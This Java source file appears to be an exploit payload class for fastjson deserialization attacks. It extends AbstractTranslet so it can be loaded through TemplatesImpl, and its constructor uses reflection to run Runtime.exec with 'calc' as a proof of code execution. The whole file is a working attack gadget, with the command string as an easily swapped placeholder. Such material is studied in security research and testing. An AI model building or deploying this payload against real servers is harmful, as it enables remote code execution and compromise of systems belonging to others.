package fasjsonxxxx;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.lang.reflect.Method;

public class EvalClassforfastjsonTemplateImpl extends AbstractTranslet {


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    public  EvalClassforfastjsonTemplateImpl() throws  Exception{
//        Runtime.getRuntime().exec("calc");

//
        Class cls = Class.forName("java.lang.Runtime");
        Method method = cls.getMethod("getRuntime",null);
        Object obs = method.invoke(null,null);
        Method method1 = obs.getClass().getMethod("exec",String.class);
        method1.invoke(obs,"calc");
    }

    public static void main(String[] args) throws Exception{
        EvalClassforfastjsonTemplateImpl evalClassforfastjsonTemplate = new EvalClassforfastjsonTemplateImpl();
    }
}
